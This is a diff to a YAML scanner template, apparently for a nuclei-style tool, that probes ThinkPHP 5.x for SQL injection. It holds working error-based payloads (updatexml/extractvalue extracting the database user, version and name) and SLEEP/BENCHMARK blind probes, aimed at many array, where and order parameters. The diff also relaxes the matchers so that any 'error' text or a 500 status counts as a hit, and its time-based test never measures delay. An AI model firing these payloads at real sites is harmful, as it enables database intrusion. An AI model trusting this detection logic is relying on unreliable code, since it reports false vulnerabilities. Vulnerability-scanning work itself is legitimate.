@@ -1,16 +1,19 @@
 id: thinkphp-sqli
 info:
-  name: ThinkPHP SQL Injection (updatexml)
+  name: ThinkPHP SQL Injection (in-sqlinjection)
   severity: Critical
   description: |
-    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞，利用 updatexml 函数进行报错注入。
-    该漏洞通常存在于数组参数的 SQL 查询中。
+    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞 (CVE-2018-20062 等)。
+    该漏洞存在于数组参数的 SQL 查询中，可利用 updatexml/extractvalue 函数进行报错注入。
+    影响版本: ThinkPHP 5.0.x < 5.0.24, 5.1.x < 5.1.31
   tags:
     - sqli
     - thinkphp
     - updatexml
+    - in-sqlinjection
   reference:
     - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection
 
 # 定义针对不同策略的 Payload 集合
 payload_sets:
@@ -18,56 +21,177 @@ payload_sets:
     - "0,updatexml(0,concat(0xa,user()),0)"
     - "0,updatexml(0,concat(0xa,version()),0)"
     - "0,extractvalue(1,concat(0xa,user()))"
+    - "1) and updatexml(1,concat(0xa,(user())),1)"
+    - "1' and updatexml(1,concat(0xa,(user())),1)#"
   aggressive:
     - "0,updatexml(0,concat(0xa,user()),0)"
     - "0,updatexml(0,concat(0xa,version()),0)"
     - "0,updatexml(0,concat(0xa,database()),0)"
     - "0,extractvalue(1,concat(0xa,user()))"
     - "0,extractvalue(1,concat(0xa,version()))"
+    - "1) and updatexml(1,concat(0xa,database()),1)"
+    - "1' and extractvalue(1,concat(0xa,user()))#"
+    - "0) or updatexml(1,concat(0xa,(select user())),1)#"
 
 requests:
-  # 测试1: 数组参数注入 (TP5 典型漏洞)
+  # ============================================================
+  # 测试1: 数组参数注入 (TP5 典型漏洞 - 核心检测)
+  # 放宽条件: 移除严格的 requires_tech 前置条件
+  # ============================================================
   - method: GET
-    preconditions:
-      requires_tech: [thinkphp]
     path:
       - "{{BaseURL}}/index.php?ids[{{payload}}]=1"
       - "{{BaseURL}}/?s=index/index/index&ids[{{payload}}]=1"
+      - "{{BaseURL}}/index.php?s=/index/index/index&ids[{{payload}}]=1"
+      - "{{BaseURL}}/index.php?data[{{payload}}]=1"
+      - "{{BaseURL}}/index.php?field[{{payload}}]=1"
+      - "{{BaseURL}}/index.php?order[{{payload}}]=1"
+    matchers-condition: or
+    matchers:
+      # 报错注入特征 (放宽: 或关系，任一命中即判定)
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "XPATH syntax error:"
+          - "syntax error"
+          - "SQLSTATE"
+          - "SQL syntax"
+          - "mysql_fetch_array()"
+          - "mysql_num_rows()"
+          - "mysql_query()"
+          - "MySQL server version for the 'RIGHT' syntax to use"
+          - "Query error"
+          - "check the manual that corresponds to your MySQL"
+          - "You have an error in your SQL syntax"
+          - "unclosed quotation mark after the character string"
+          - "quoted string not properly terminated"
+          - "Warning: mysql_"
+          - "Fatal error: Uncaught exception"
+          - "ThinkException"
+          - "Database Error"
+          - "SQL Error"
+          - "PDO::prepare()"
+          - "SQLSTATE[HY000]: General error"
+          - "SQLSTATE[42000]"
+          - "SQLSTATE[23000]"
+          - "SQLSTATE[42S22]"
+          - "SQLSTATE[21S01]"
+        condition: or
+        part: body
+      # 状态码500也作为辅助判定
+      - type: status
+        status: [500]
+
+  # ============================================================
+  # 测试2: 通用参数注入 (防止数组参数路径不生效)
+  # 放宽: 使用 or 条件而非 and
+  # ============================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?id={{payload}}"
+      - "{{BaseURL}}/?s=index/index/index&id={{payload}}"
+      - "{{BaseURL}}/index.php?name={{payload}}"
+      - "{{BaseURL}}/index.php?username={{payload}}"
+      - "{{BaseURL}}/index.php?user={{payload}}"
+      - "{{BaseURL}}/index.php?search={{payload}}"
+    matchers-condition: or
+    matchers:
+      # 关键报错特征
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "XPATH syntax error:"
+          - "extractvalue()"
+          - "updatexml()"
+          - "SQLSTATE"
+          - "SQL syntax"
+          - "mysql_"
+          - "Think\\Db\\Exception"
+          - "PDOException"
+        condition: or
+        part: body
+      # 状态码异常
+      - type: status
+        status: [500, 502, 503]
+      # 响应体包含典型错误信息
+      - type: word
+        words:
+          - "error"
+          - "Error"
+          - "exception"
+          - "Exception"
+          - "fatal"
+          - "Fatal"
+        condition: or
+        part: body
+
+  # ============================================================
+  # 测试3: POST请求注入 (覆盖更多攻击面)
+  # ============================================================
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php"
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "ids[{{payload}}]=1"
     matchers-condition: or
     matchers:
       - type: word
         words:
           - "XPATH syntax error"
-          - "syntax error"
+          - "XPATH syntax error:"
+          - "extractvalue()"
+          - "updatexml()"
           - "SQLSTATE"
+          - "SQL syntax"
+          - "mysql_"
+          - "Think\\Db\\Exception"
+          - "PDOException"
+          - "Database Error"
         condition: or
         part: body
       - type: status
         status: [500]
 
-  # 测试2: 通用 SQL 探测 (防止路径识别失败)
+  # ============================================================
+  # 测试4: 多参数组合注入 (TP5 where/order/group 注入)
+  # ============================================================
   - method: GET
-    preconditions:
-      requires_tech: [thinkphp]
     path:
-      - "{{BaseURL}}/index.php?id={{payload}}"
-      - "{{BaseURL}}/?s=index/index/index&id={{payload}}"
-    matchers-condition: and
+      - "{{BaseURL}}/index.php?where[id]={{payload}}"
+      - "{{BaseURL}}/index.php?where[{{payload}}]=1"
+      - "{{BaseURL}}/index.php?order[id]={{payload}}"
+      - "{{BaseURL}}/index.php?order[{{payload}}]=asc"
+      - "{{BaseURL}}/index.php?group[id]={{payload}}"
+      - "{{BaseURL}}/index.php?having[id]={{payload}}"
+    matchers-condition: or
     matchers:
-      - type: status
-        status: [500]
       - type: word
         words:
           - "XPATH syntax error"
+          - "XPATH syntax error:"
+          - "extractvalue()"
+          - "updatexml()"
+          - "SQLSTATE"
+          - "SQL syntax"
+          - "mysql_"
+          - "Think\\Db\\Exception"
+          - "Database Error"
+          - "SQL Error"
+        condition: or
         part: body
+      - type: status
+        status: [500]
 
-  # 测试3: 时间盲注探测
+  # ============================================================
+  # 测试5: 时间盲注探测 (用于无回显的场景)
+  # ============================================================
   - method: GET
-    preconditions:
-      requires_tech: [thinkphp]
     path:
       - "{{BaseURL}}/index.php?ids[SLEEP(3)]=1"
       - "{{BaseURL}}/index.php?ids[BENCHMARK(5000000,SHA1('test'))]=1"
+      - "{{BaseURL}}/index.php?id=SLEEP(3)%23"
     matchers:
       - type: status
-        status: [200]
+        status: [200, 500]
